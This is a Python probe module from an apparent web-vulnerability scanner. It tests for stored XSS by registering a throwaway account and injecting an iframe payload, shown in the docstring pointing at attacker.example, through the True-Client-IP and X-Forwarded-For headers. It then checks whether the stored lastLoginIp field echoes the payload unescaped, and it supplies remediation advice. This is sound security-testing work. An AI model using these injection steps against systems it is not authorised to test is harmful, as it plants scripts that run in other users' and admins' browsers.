#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Stored XSS: server stores a header verbatim in the user record.

`GET /rest/saveLoginIp` records the caller's IP onto their user
record. When the IP is sourced from `True-Client-IP` (or
`X-Forwarded-For`) without sanitisation, an attacker plants HTML/JS
payload there. The next time the user views their profile (or an
admin views the user-list dashboard), the payload renders.

Detection signal:
  Authenticated GET /rest/saveLoginIp with header
  `True-Client-IP: <iframe src="https://attacker.example">`. Then
  GET /api/Users/<own_id> → response includes the literal payload
  (not its escaped form) in `lastLoginIp`.

The verification step doesn't actually run JS — but the LITERAL
payload appearing where a real user-agent would render it is enough
evidence. Any browser viewing that field would execute the iframe.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

SAVE_IP_PATH = "/rest/saveLoginIp"
USERS_PATH   = "/api/Users/{id}"
WHOAMI_PATH  = "/rest/user/whoami"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"xss-stored-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class XssStoredLastLoginIpProbe(Probe):
    name = "xss_stored_lastloginip"
    summary = ("Detects stored XSS via True-Client-IP / X-Forwarded-"
               "For → user.lastLoginIp.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--marker-host", default="dast-xss-marker.test",
            help="Host name to embed inside the iframe payload.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        sess = _register_and_login(client, origin)
        if not sess.get("token") or not sess.get("user_id"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        uid   = sess["user_id"]
        # We use a long, distinctive payload so a hit is unambiguous.
        marker = f"<iframe src=\"https://{args.marker_host}/{secrets.token_hex(4)}\"></iframe>"

        r1 = client.request("GET", urljoin(origin, SAVE_IP_PATH), headers={
            "Authorization": f"Bearer {token}",
            "True-Client-IP": marker,
            "X-Forwarded-For": marker,
        })
        save = {"step": "saveLoginIp", "status": r1.status, "size": r1.size}

        # Read back. Some builds expose lastLoginIp on whoami, some on
        # /api/Users/<id>. Try both.
        leaked: list[dict] = []
        for url in (urljoin(origin, USERS_PATH.format(id=uid)),
                    urljoin(origin, WHOAMI_PATH)):
            r = client.request("GET", url, headers={
                "Authorization": f"Bearer {token}",
            })
            row = {"url": url, "status": r.status, "size": r.size}
            if r.status == 200 and r.body and marker in r.text:
                row["leaked_marker"] = True
                leaked.append(row)
                break
            leaked.append(row)

        evidence = {"origin": origin, "user_id": uid, "marker": marker,
                    "save": save, "verify": leaked}
        if any(row.get("leaked_marker") for row in leaked):
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: stored XSS on {origin} — the "
                         "True-Client-IP header was persisted "
                         "verbatim on the user record. Any rendering "
                         "surface will execute the iframe."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Validate / coerce the IP-address header at "
                    "ingest. Refuse anything that doesn't parse as "
                    "an inet address. Or strip the field on read and "
                    "render it through the framework's HTML-escape "
                    "helper. And set Content-Security-Policy to "
                    "block inline iframes / scripts on the views "
                    "that show profile data."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: marker did not appear in the user "
                     f"record on {origin}."),
            evidence=evidence,
        )


if __name__ == "__main__":
    XssStoredLastLoginIpProbe().main()
